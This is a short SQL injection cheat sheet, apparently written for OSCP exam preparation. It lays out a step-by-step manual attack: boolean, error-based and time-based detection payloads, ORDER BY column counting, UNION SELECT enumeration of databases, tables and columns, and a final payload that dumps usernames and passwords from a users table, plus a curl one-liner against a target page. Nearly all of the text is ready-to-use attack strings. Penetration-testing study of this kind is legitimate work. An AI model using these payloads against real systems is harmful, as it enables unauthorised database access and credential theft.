___


## **🛠 1. Detecting SQL Injection**

Test input fields, URL parameters, cookies, and headers.

**Boolean-based tests:**

sql

CopyEdit

`' OR '1'='1 --     -- should return valid results ' AND '1'='2 --    -- should return no results`

**Error-based tests:**

sql

CopyEdit

`'      -- single quote for syntax error "      -- double quote ')     -- closing parentheses`

---

## **📏 2. Find the Number of Columns**

sql

CopyEdit

`' ORDER BY 1 -- ' ORDER BY 2 -- ' ORDER BY 3 --`

Increase the number until it errors.  
Last working number = column count.

---

## **🎯 3. Identify Displayed Columns**

sql

CopyEdit

`' UNION SELECT NULL,NULL,NULL --`

Replace `NULL` one at a time with:

sql

CopyEdit

`'string'   -- to see if it’s displayed`

Example:

sql

CopyEdit

`' UNION SELECT 'abc',NULL,NULL --`

---

## **🛡 4. Extract DB Info**

**Database, User, Version:**

sql

CopyEdit

`' UNION SELECT database(), user(), version() --`

---

## **📚 5. List All Databases**

sql

CopyEdit

`' UNION SELECT schema_name, NULL, NULL    FROM information_schema.schemata --`

---

## **📂 6. List Tables in a DB**

sql

CopyEdit

`' UNION SELECT table_name, NULL, NULL    FROM information_schema.tables    WHERE table_schema='target_db' --`

---

## **📄 7. List Columns in a Table**

sql

CopyEdit

`' UNION SELECT column_name, NULL, NULL    FROM information_schema.columns    WHERE table_name='users' --`

---

## **🔓 8. Dump Data**

sql

CopyEdit

`' UNION SELECT username, password, NULL    FROM users --`

---

## **⏳ 9. Time-based Blind SQLi**

sql

CopyEdit

`' AND SLEEP(5) --`

If response is delayed, injection works.

---

## **🛠 10. Automating without SQLmap**

You can use **`curl` + `grep`** in Bash to automate step-by-step:

bash

CopyEdit

`curl "http://target/page.php?id=1' UNION SELECT database(),NULL,NULL-- -"`

---

## **💡 Tips for OSCP**

- Avoid automation tools like SQLmap.
    
- Use `curl`, `wget`, or **Burp Repeater** to speed up.
    
- Always comment out the rest of the query with `-- -` or `#`.
    
- If no output, try blind or time-based enumeration.




